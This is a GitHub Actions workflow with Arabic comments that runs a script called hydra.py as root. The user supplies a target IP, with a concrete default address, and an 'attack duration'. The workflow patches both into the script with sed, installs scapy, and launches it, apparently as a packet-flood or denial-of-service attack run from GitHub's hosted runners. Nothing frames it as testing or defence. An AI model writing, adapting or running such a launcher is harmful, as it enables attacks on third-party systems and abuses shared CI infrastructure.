# اسم الـ Workflow: Debug and Run Hydra (v12 - Simplest)
name: Debug and Run Hydra (v12)

on:
  workflow_dispatch:
    inputs:
      target_ip:
        description: 'عنوان IP الهدف'
        required: true
        default: '63.246.154.12'
      duration:
        description: 'مدة الهجوم بالثواني'
        required: true
        default: '120' # دقيقتان فقط للاختبار السريع

jobs:
  # مهمة واحدة فقط، بدون أي استراتيجيات
  single_attack_test:
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v3

      - name: Set up Python 3.9
        uses: actions/setup-python@v3
        with:
          python-version: 3.9

      - name: Install dependencies for ROOT
        run: |
          echo "تثبيت المكتبات باستخدام sudo..."
          sudo python3 -m pip install --upgrade pip
          sudo pip3 install scapy aiodns
          echo "تم تثبيت المكتبات."

      - name: Prepare and Verify
        run: |
          echo "تعديل الكود بالمدخلات..."
          sed -i "s/TARGET_IP = .*/TARGET_IP = \"${{ github.event.inputs.target_ip }}\"/" hydra.py
          sed -i "s/DURATION = .*/DURATION = ${{ github.event.inputs.duration }}/" hydra.py
          
          echo "--- محتوى الكود قبل التشغيل ---"
          cat hydra.py
          echo "--------------------------------"
          
          echo "التحقق من إصدار بايثون وصلاحيات sudo..."
          python3 --version
          sudo python3 --version
          echo "التحقق من وجود scapy لمستخدم root..."
          sudo python3 -c "import scapy; print('Scapy is available for root!')"

      - name: Launch Hydra and Monitor
        # ضمان استمرار المهمة للمدة المطلوبة + دقيقة
        timeout-minutes: ${{ (github.event.inputs.duration / 60) + 1 }}
        run: |
          echo "بدء تشغيل hydra.py الآن..."
          # التشغيل المباشر مع طباعة المخرجات والأخطاء مباشرة في سجل المهمة
          sudo python3 -u hydra.py
          echo "انتهى تشغيل hydra.py."
